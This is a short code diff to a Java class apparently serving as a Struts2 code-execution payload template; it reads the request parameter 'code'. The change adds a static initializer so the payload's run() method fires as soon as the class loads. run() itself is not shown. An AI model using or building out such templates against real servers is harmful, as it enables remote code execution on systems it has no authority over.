@@ -6,12 +6,19 @@ import java.lang.reflect.Method;
 
 public class Struts2CodeExecTpl {
 
+    static {
+        try {
+            new Struts2CodeExecTpl();
+        } catch (Exception e) {
+        }
+    }
+
     private  String getReqParamName() {
         return "code";
     }
 
 
-    public Struts2CodeExecTpl() throws Exception {
+    public Struts2CodeExecTpl() throws Exception{
         run();
     }
 
